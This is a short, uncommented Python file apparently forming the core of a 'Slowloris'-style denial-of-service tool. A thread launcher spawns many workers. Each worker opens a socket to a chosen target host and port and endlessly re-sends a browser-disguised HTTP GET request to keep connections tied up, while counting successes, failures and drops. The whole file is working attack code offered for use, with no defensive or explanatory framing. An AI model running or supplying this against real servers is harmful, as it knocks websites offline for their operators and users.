import threading
import sys
import socket  
from time import sleep
import random
 
class ThreadMaker:

    def lunch(self, functionObj, arguments, thread_count):
        fn = functionObj
        for i in range(0, thread_count):
            try:
                t = threading.Thread(target=fn, args=(arguments, i))
                t.start()
            except:
                print("can not create new thread.")
            sleep(0.05)



class SlowlorisConnection:

    def __init__(self):
        self.connection_success_count = 0
        self.connection_failed_count = 0
        self.connection_dropped_count = 0
    

    def create_slowlorisConnection(self, arguments_dict, threadID):

        port = arguments_dict['port']
        target= arguments_dict['target']
        timeinterval = arguments_dict['timeinterval']
        uri = arguments_dict['uri']
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


        headers_d = {   
            'Host': target,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            }
        headers = ""
        for k in list(headers_d.keys()):
            value = headers_d[k]
            headers += k + ": " + str(value) + "\r\n"
        headers += "\r\n"    
        request = bytes("GET /"+str(uri)+" HTTP/1.1\r\n" + headers, 'utf-8') 



        try:
            s.settimeout(3)
            s.connect((target, port))
            self.connection_success_count += 1
        except:
            self.connection_failed_count += 1
            return


        count = 0
        while True:
            sleep(timeinterval)
            try:
                s.settimeout(3)
                s.send(request)

            except:
                self.connection_dropped_count += 1
                return
            count += 1
                





